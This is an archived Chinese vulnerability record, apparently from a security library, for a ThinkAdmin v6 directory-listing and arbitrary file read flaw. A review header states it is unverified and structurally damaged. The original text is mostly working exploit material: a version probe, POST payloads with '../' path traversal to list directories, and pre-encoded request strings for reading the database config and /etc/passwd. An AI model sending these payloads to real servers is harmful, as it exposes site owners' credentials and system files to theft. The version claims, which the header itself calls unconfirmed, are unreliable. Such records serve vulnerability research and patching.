---
source: "白阁文库 BaizeSec/bylibrary"
product: "ThinkAdmin / 更新 API"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ThinkAdmin v6 列目录任意文件读取"
prerequisites: "来源所述条件，未列明部分仍待核：v6，文字写 V5 前也能读；无精确补丁范围"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7cbbd85051aa0b54f846b3f5"
entity_id: "ve-7cbbd85051aa0b54f846b3f5"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：v6，文字写 V5 前也能读；无精确补丁范围

代码与实验材料：列目录和 Windows/Linux 编码路径齐全，无 encode 函数、响应或代码分析

来源证据范围：只有白阁归档来源，无上游 issue

- **事实待核（1）**：缺编号和主文关联；依据：正文和 frontmatter 都无 CVE，内容与 492 的 25540 一致。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：结构和版本边界损坏；依据：第二套 YAML frontmatter 在正文；“V5前”与 492 的 v5 表述需核实；代码围栏紧贴文字。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：缺原理及结果证据；依据：仅预编码常量和操作步骤，无法区分路径不存在、权限问题与漏洞。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkAdmin v6 列目录任意文件读取

---
title: 'ThinkAdmin v6 列目录任意文件读取'
date: Wed, 16 Sep 2020 09:56:04 +0000
draft: false
tags: ['白阁-漏洞库']
---

ThinkAdmin v6 列目录任意文件读取 V5前，直接也能读取 列目录 poc: version()可以获取到当前版本：2020.08.03.01，≤这个版本的都有可能存在漏洞 http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version 读取网站根目录Payload: http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node post:rules=\["/"\] 也可以使用../来进行目录穿越-》 rules=\["../../../"\] 任意文件读取 需要进行encode() 加密一下字符串 On Windows read database.php payload:

```
database.php   =>  public/static/../../config/database"php
/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 
```

On Linux read /etc/passwd payload:

```
/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s 
```


---

> 来源：白阁文库 BaizeSec/bylibrary
